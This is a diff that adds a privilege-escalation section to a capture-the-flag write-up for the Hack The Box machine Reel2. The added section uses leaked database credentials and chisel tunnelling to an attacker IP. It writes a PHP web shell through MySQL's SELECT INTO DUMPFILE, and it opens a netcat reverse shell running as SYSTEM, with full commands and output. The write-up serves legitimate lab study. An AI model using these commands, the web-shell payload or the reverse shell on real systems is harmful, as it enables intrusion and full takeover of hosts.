@@ -352,6 +352,7 @@ But this is slow af. I moved to `netcat` so I don't have to use the `&{}` again.
 User flag is done here.
 
 ![d88e8be90f4fd2dbae549c18345dbea8.png](_resources/71caf5167a764d1f934843ad21f2538b.png)
+# Privilege Escalation
 
 ## Getting the Root Flag
 
@@ -447,3 +448,92 @@ I can grab the root with CheckFile function
 ```
 [reel2.htb]: PS>Check-File C:\programdata\sys\Desktop\root.txt
 ```
+
+## Shell as NT Authority\System
+
+At the first time I thought the web server uses a Windows IIS, so the source code should be placed inside `C:/inetpub/wwwroot` but there’s nothing there except the IIS default page files and I don’t have write permission as well.
+
+Then I remembered that the SNS page does leak its path 😅.
+
+![16189cc6a85dd1c9a9318c10c2b751f7.png](_resources/0664096eb26b4901a3ca57c0c851270f.png)
+
+I can use jea_test_account to read the leaked file.
+
+![389071f3ab16d42d8db355a7675f1dca.png](_resources/c181f3029f5949d283f76a9d042eb8d9.png)
+
+According to the original source code on Github, the database credentials is stored in `C:\xampp\htdocs\social\config\connect.php`
+
+![7cb022f5dc965b9151497a9318dffa68.png](_resources/838e02ce5b9c4fc1975ce5a69e49245e.png)
+
+DB credential: `root:Gregswd123FAEytjty`
+
+I already knew from winPEAS output that mysql service is running 
+
+![35873fd1decc2cda088958d092bb2037.png](_resources/86e4abf7e97f429796e4542dab312ff9.png)
+
+Because I can't get the process owner (I'm using accesschk from sysinternal) then there's a possibility it's running with higher privilege.
+
+![814ec1f9a607cb7dd59acec293ea94c0.png](_resources/98f1508aed004df3b0e6300cf72b834f.png)
+
+Fire up the server with `--reverse` will allows the client (Reel2) to specify which port to use in remote (my Kali)
+
+```
+root@iamf# chisel server --reverse -p 9005
+2021/03/15 13:48:12 server: Reverse tunnelling enabled
+2021/03/15 13:48:12 server: Fingerprint 3a:1f:5f:a2:35:84:ae:7d:88:cc:9c:56:a6:27:26:d2
+2021/03/15 13:48:12 server: Listening on 0.0.0.0:9005...
+``` 
+
+In Reel2, I'll have to download the chisel binary that's hosted in my machine and then start the tunnelling.
+```
+PS C:\Users\k.svensson\Documents> wget 10.10.14.35/chisel_win.exe -o cs.exe
+wget 10.10.14.35/chisel_win.exe -o cs.exe
+PS C:\Users\k.svensson\Documents> .\cs.exe client 10.10.14.35:9005 R:3306:0.0.0.0:3306
+.\cs.exe client 10.10.14.35:9005 R:3306:0.0.0.0:3306
+2021/03/15 18:51:26 client: Connecting to ws://10.10.14.35:9005
+2021/03/15 18:51:28 client: Fingerprint 3a:1f:5f:a2:35:84:ae:7d:88:cc:9c:56:a6:27:26:d2
+2021/03/15 18:51:28 client: Connected (Latency 73.9349ms)
+```
+Now I can just connect with the DB credentials and drop the shell right inside the Wallstant root directory (`C:\xampp\htdocs\social\`)
+```
+root@iamf# mysql -u root -h 127.0.0.1 -p
+Enter password:Gregswd123FAEytjty
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 11
+Server version: 10.4.13-MariaDB mariadb.org binary distribution
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]> SELECT '<?php echo system($_GET["iamf"]); ?>' into DUMPFILE 'C:/xampp/htdocs/social/iamf.php';
+Query OK, 1 row affected (0.890 sec) 
+```
+
+Access it via curl or browser.
+```
+root@iamf# curl -s "http://10.10.10.210:8080/iamf.php?iamf=whoami" 
+nt authority\system
+```
+
+
+I had the previous netcat executable on k.svensson documents directory, so I could just have it executed to pop a system shell
+
+```
+root@iamf# curl -s "http://10.10.10.210:8080/iamf.php?iamf=C%3A%2Fusers%2Fk.svensson%2Fdocuments%2Fr.exe%20-e%20cmd%2010.10.14.35%209002"
+```
+And I'm done.
+```
+root@iamf# rlwrap nc -nvlp 9002 
+listening on [any] 9002 …
+connect to [10.10.14.35] from (UNKNOWN) [10.10.10.210] 15902
+Microsoft Windows [Version 6.3.9600]
+© 2013 Microsoft Corporation. All rights reserved.
+C:\xampp\htdocs\social>hostname
+hostname
+Reel2
+```
+
+![7f69f42038a581f9e206e6fe191f903d.png](_resources/42348fc9be024e34aff3a3809ef6a535.png)
+
+![ntsystem](_resources/ntsystem.png)
